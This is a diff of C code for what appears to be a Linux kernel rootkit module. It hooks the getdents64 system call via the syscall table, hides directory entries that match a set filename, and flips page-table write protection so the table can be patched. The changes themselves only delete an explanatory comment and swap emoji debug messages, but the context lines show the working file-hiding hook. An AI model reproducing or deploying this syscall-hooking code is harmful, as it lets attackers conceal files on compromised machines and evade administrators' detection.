@@ -8,26 +8,13 @@ uintptr_t **sct;
 asmlinkage int (*getdents64_original) (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
 
 asmlinkage int   getdents64_hook      (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
-/*
-run the actual system call,
-loop through the structs returned,
-compare filename with constant FILE_NAME,
-if matches recalculate what is being returned (nob, dirp)
-
-d_reclen: Size of this dirent (directory entry struct)
-d_name:   Filename (null-terminated)
-nob:  number of bytes (of all dirent structs)
-dirp: directory entry struct pointer
-curr: current dirp
-next: next    dirp
-*/
   int nob;
   struct linux_dirent64 *curr;
   char *next;
   int i;
   int len;
 
-  printk("🌐\n");
+  printk("🍺\n");
 
   nob = getdents64_original(fd, dirp, count);
   curr = dirp;
@@ -35,8 +22,6 @@ next: next    dirp
   i = 0;
   while(i < nob) {
     int size = curr->d_reclen;
-
-    printk("🥃\n");
 
     if(strncmp(curr->d_name, FILE_NAME, strlen(FILE_NAME)) == 0) {
       printk("🍺 Found the file\n");
@@ -65,7 +50,7 @@ int set_page_rw(unsigned long addr, int f) {
   }
   else {
     pte->pte = pte->pte &~ _PAGE_RW;
-    printk("🥤\n");
+    printk("⭐️⭐️\n");
   }
 
   return 0;
